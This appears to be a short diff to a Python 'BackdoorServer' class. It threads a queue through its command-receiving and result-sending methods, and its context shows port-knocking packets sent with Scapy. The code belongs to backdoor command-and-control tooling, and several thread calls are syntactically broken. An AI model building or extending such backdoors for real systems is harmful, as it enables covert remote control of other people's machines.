@@ -67,7 +67,7 @@ class BackdoorServer(object):
             send(IP(dst=ip_addr)/TCP(dport=port),verbose=0)
         
 
-    def recv_command(self):
+    def recv_command(self, queue):
         """Receives and deserialises the next command from the connected client.
         
         Returns the received command as a Command object.
@@ -107,7 +107,7 @@ class BackdoorServer(object):
                 return cmd
 
 
-    def send_result(self, result):
+    def send_result(self, queue, result):
         """Sends the results of a command execution to the client.
         
         Positional arguments:
@@ -175,7 +175,7 @@ class BackdoorServer(object):
                     result_send = Thread(target=self.send_result, args(queue,result))
                     result_send.setDaemon(True)
                     result_send.start()
-                    file_watch = Thread(target=file_watch, args(queue,))
+                    file_watch = Thread(target=self.recv_command, args(queue,))
                     file_watch.setDaemon(True)
                     file_watch.start()
 
